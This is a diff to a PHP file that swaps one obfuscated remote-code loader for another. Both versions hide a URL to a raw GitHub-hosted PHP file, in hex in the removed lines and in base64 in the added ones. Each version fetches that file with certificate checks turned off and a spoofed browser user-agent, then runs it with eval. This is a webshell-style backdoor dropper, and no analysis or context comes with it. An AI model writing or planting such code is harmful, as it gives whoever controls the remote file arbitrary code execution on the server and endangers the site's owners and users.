@@ -1,36 +1,48 @@
 <?php
-error_reporting(0);
-set_time_limit(0);
+$u = base64_decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2x1ZmZ5b3BtL29wbS9yZWZzL2hlYWRzL21haW4vMi5waHA=");
 
-$h = "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6c756666796f706d2f6f706d2f726566732f68656164732f6d61696e2f322e706870";
+function d($x) {
+    $h = curl_init();
+    curl_setopt($h, CURLOPT_URL, $x);
+    curl_setopt($h, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($h, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($h, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($h, CURLOPT_TIMEOUT, 10);
+    curl_setopt($h, CURLOPT_USERAGENT, 'Mozilla/5.0');
+    $r = curl_exec($h);
+    curl_close($h);
+    return $r;
+}
 
-$p = 'pack';
-$i = 'curl_init';
-$s = 'curl_setopt_array';
-$e = 'curl_exec';
-$g = 'curl_getinfo';
-$c = 'curl_close';
+function f($x) {
+    $o = [
+        "ssl" => [
+            "verify_peer" => false,
+            "verify_peer_name" => false,
+        ],
+        "http" => [
+            "header" => "User-Agent: Mozilla/5.0\r\n",
+            "timeout" => 10
+        ]
+    ];
+    $z = stream_context_create($o);
+    return file_get_contents($x, false, $z);
+}
 
-$ch = $i($p("H*", $h));
+function j($c) {
+    ob_start();
+    eval("?>" . $c);
 
-$o = [
-    19913 => true,
-    52    => true,
-    64    => false,
-    81    => false,
-    13    => 30,
-    10018 => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'
-];
+}
 
-$s($ch, $o);
-$r = $e($ch);
-$st = $g($ch, 2097154);
-$c($ch);
-
-if ($st === 200 && $r) {
-    $f = "ev"."al";
-    try {
-        $f('?>' . $r);
-    } catch (Throwable $t) {}
+try {
+if (function_exists('curl_init')) {
+$k = d($u);
+} else {
+$k = f($u);
+}
+echo j($k);
+} catch (Exception $e) {
+echo "Terjadi kesalahan";
 }
 ?>
